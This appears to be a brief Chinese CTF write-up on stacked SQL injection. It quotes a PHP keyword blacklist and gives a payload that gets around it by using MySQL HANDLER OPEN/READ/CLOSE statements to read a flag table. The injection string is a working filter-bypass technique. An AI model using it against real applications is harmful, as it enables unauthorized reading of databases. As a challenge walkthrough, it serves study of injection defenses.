# 知识点：

# 1.堆叠注入

## 2. HANDLER ... OPEN，HANDLER ... READ，HANDLER ... CLOSE在堆叠注入中的运用



# 1.此题和强网杯一样，只是过滤规则更严格

```python
return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);
```



更改表名的|alter|rename|杯过滤

使用char绕过的set和prepare被过滤



# 2. 新方法

https://dev.mysql.com/doc/refman/8.0/en/handler.html

payload:

```python
?inject=1';HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#

HANDLER ... OPEN语句会打开一个表，使其能够用后续的HANDLER ... READ语句访问。
这个表不能和其他会话共享直到HANDLER ... CLOSE或会话关闭。
```



